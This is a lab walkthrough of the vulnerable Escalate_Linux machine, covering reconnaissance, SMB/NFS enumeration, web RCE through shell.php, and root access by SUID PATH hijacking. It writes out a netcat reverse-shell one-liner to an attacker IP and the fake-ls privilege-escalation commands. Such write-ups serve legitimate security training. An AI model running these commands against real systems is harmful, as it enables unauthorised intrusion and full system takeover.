# SEC-Walkthrough-EscalateLinux

![Linux](https://img.shields.io/badge/Linux-Escalation-red?logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![License](https://img.shields.io/badge/Use-Educational-green)

> _This walkthrough documents the exploitation process of the Escalate_Linux vulnerable machine. It covers the full process from reconnaissance to privilege escalation using common tools found in Kali Linux._

---

## 🧠 Objective

The goal of this walkthrough is to simulate a full offensive security assessment against a deliberately vulnerable Linux machine (Escalate_Linux), practicing enumeration, exploitation, and privilege escalation techniques.

---

## ⚙️ Lab Setup

- **Attacker Machine**: Kali Linux (IP: 10.10.1.20)
- **Target Machine**: Escalate_Linux (IP: 10.10.1.21)
- **Network Type**: NAT (isolated)
- **Tools Used**: `nmap`, `enum4linux`, `showmount`, `rpcinfo`, `smbclient`, `curl`, `netcat`, `find`

---

## 🔎 Reconnaissance

Basic connectivity and service detection via Nmap:

```bash
nmap -sC -sV -T4 -Pn 10.10.1.21
```

Services discovered:

- Apache 2.4.29 on port 80
- SMB on ports 139 and 445
- RPC and NFS on ports 111 and 2049

---

## 📡 Scanning & Enumeration

### SMB Enumeration

```bash
enum4linux -a 10.10.1.21
smbclient -L //10.10.1.21/ -N
```

- Users: user1, user2, ..., user8
- Shares found: `liteshare` (requires auth), `IPC$` (anonymous)

### NFS Enumeration

```bash
showmount -e 10.10.1.21
rpcinfo -p 10.10.1.21
```

- `/home/user5` is exported to all clients (`*`), no auth required.

---

## 💥 Exploitation

### Remote Code Execution (Apache)

Discovered `shell.php` page:

```bash
curl http://10.10.1.21/shell.php?cmd=whoami
```

Successful reverse shell established:

```bash
mkfifo /tmp/f; nc 10.10.1.20 2600 < /tmp/f | /bin/bash > /tmp/f
```

Listener on attacker:

```bash
nc -lvnp 2600
```

### User Access Gained: `user6`

---

## 🔐 Privilege Escalation

### Step 1: SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Identified `/home/user5/script` with SUID bit.

### Step 2: PATH Manipulation

Created fake `ls` script:

```bash
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

Executing `/home/user5/script` now spawns a root shell.

### Root Access Gained ✅

---

## 📌 Lessons Learned

- Misconfigured NFS exports can be critical entry points.
- Web RCE vectors (e.g. `shell.php`) should never be exposed in production.
- SUID binaries that call commands via relative path can be exploited with `$PATH` hijacking.
- Always sanitize user inputs and isolate user permissions.

---

## 📁 References

- [CVE-2017-15715](https://nvd.nist.gov/vuln/detail/CVE-2017-15715)
- [CVE-1999-0629](https://nvd.nist.gov/vuln/detail/CVE-1999-0629)
- [CVE-1999-0519](https://nvd.nist.gov/vuln/detail/CVE-1999-0519)
- [RedTeamOperations Escalate_Linux](https://github.com/RedTeamOperations/Vulnerable_Machine)
- [MITRE ATT&CK Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)

---

> 🛡️ This walkthrough was created for educational purposes only. Always conduct ethical hacking in controlled environments with permission.

